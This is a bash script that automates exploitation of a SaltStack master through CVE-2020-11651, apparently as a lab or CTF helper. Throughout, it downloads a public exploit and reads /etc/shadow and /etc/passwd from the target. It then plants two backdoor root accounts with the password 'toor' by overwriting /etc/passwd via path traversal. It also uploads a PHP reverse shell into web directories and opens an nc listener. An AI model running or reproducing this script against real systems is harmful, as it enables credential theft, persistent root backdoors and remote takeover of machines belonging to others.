#!/bin/bash

ls exploit.py
if [ $? -ne 0 ]; then
	echo -e '\E[31;35m' "Downloading exploit.py from github";tput sgr0
	wget https://raw.githubusercontent.com/jasperla/CVE-2020-11651-poc/master/exploit.py
else 
	echo ""
fi

ls passwd
if [ $? = 0 ]; then
	rm -rf passwd
else
	echo ""
fi
echo -e '\E[31;40m' "RHOST"; tput sgr0
read RHOST
echo -e '\E[31;40m' "RPORT (usually 4506)"; tput sgr0
read RPORT
echo -e '\E[31;35m' "Downloading /etc/shadow";tput sgr0
python3 exploit.py --master $RHOST -p $RPORT -r /etc/shadow > shadow
echo -e '\E[31;35m' "Downloading /etc/passwd";tput sgr0
python3 exploit.py --master $RHOST -p $RPORT -r /etc/passwd > passwd
echo 'root2:$1$5D48mR9m$buJLq/8jTQzt2LREUjfrZ0:0:0:root:/root:/bin/bash' >> passwd
echo "root3:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> passwd
echo -e '\E[31;40m' "Put user root2 with password toor in passwd, uploading now"; tput sgr0
echo -e '\E[31;40m' "Put user root3 with password toor in passwd, uploading now"; tput sgr0
python3 exploit.py --master $RHOST -p $RPORT --upload-src passwd --upload-dest "../../../../../../../../../etc/passwd"
rm -rf passwd
python3 exploit.py --master $RHOST -p $RPORT -r /etc/passwd > passwd
cat passwd | grep -i root
read -p "If root2 or root3 exists press enter, if not exploit failed, remember password is toor"; 
echo -e '\E[31;35m' "Most likely cannot ssh, you can try if you want, we are now uploading a reverse shell to /var/www/html";tput sgr0
echo -e '\E[31;40m' "RHOST Web Server Port?";tput sgr0
read WPORT
echo -e '\E[31;35m' "Downloading Pentestmonkey Reverse Shell";tput sgr0
ls shell.php
if [ $? = 0 ]; then
	rm -rf shell.php*
else
	echo ""
fi
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
mv php-reverse-shell.php shell.php
nano shell.php
echo -e '\E[31;40m' "LPORT (same one as you just put)"; tput sgr0
read LPORT
python3 exploit.py --master $RHOST -p $RPORT --upload-src shell.php --upload-dest "../../../../../../../../../var/www/html/shell.php"
python3 exploit.py --master $RHOST -p $RPORT --upload-src shell.php --upload-dest "../../../../../../../../../var/www/shell.php"
python3 exploit.py --master $RHOST -p $RPORT --upload-src shell.php --upload-dest "../../../../../../../../../srv/salt/shell.php"
echo ""
echo ""
firefox http://$RHOST:$WPORT/shell.php && nc -lvnp $LPORT
